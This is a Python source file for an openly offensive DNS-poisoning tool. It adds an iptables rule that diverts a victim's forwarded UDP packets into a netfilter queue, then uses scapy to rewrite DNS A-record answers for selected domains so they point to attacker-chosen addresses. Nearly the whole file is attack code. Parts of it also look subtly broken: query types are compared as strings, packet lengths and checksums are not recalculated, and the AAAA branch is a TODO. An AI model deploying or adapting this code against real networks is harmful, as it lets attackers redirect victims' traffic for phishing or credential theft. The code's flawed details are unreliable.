from scapy.all import *
from netfilterqueue import NetfilterQueue     #Library capable of handling IP packets
import multiprocessing
import os

class DnsPoisoner(multiprocessing.Process):

    def __init__(self, ip_victim, queue_num):

        multiprocessing.Process.__init__(self)

        self.urls_to_spoof = {}
        self.queue         = NetfilterQueue()    #Initialize netfilterqueue object  
        #Create rules on how to handles packets destined for your LAN
        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #Restores original ip rule
        self.exit          = False

        #Initialize queue identified by queue_num and specify that the packets are passed as arguments of handle_packet()
        self.queue.bind(queue_num, self.handle_packet) 

    def add_url(self, url, ip):
        self.urls_to_spoof[url] = ip

    def handle_packet(self, packet_nfqueue):

        packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
        
        if packet_scapy.haslayer(DNSRR):
            packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet
            packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet

        packet_nfqueue.accept()    #accept the packet and release it back into the wild

    def edit_dnsrr(self, packet):
        """Edits DNS request answer in order to poison"""
        if packet[DNSQR].qname in self.urls_to_spoof.keys():
            
            if packet[DNSQR].qtype == "A":
                packet[DNSRR].rdata = self.urls_to_spoof[packet[DNSQR].qname]
            
            if packet[DNSQR].qtype == "AAAA":
                pass # TODO

        return packet

    def run(self):

        os.system(self.iprule_add)    #make sure DNS packets are intercepted
        self.queue.run()    #queue starts accepting packages

        while not self.exit:
            time.sleep(1)

        self.queue.unbind()    #delete queue

    def stop(self):

        os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
        self.exit = True
